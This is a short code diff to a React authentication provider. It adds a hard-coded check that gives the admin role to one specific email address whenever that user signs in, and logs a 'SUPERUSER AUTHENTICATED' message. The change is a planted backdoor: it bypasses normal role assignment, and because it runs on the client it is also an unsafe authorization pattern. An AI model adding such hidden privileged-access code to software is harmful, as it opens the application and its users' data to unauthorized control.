@@ -25,6 +25,11 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       const activeProfile = await syncUserProfile(currentUser);
       
       if (activeProfile) {
+        // ADMIN_FORCE: Hard-coded check for Superuser authority
+        if (currentUser?.email === 'wambuamaxwell696@gmail.com') {
+          activeProfile.role = 'admin';
+          console.log("SUPERUSER AUTHENTICATED: B3ST_SEKTA_ADMIN_LEVEL_0");
+        }
         setProfile(activeProfile);
         if (activeProfile.accent_color) {
           document.documentElement.style.setProperty('--primary', activeProfile.accent_color);
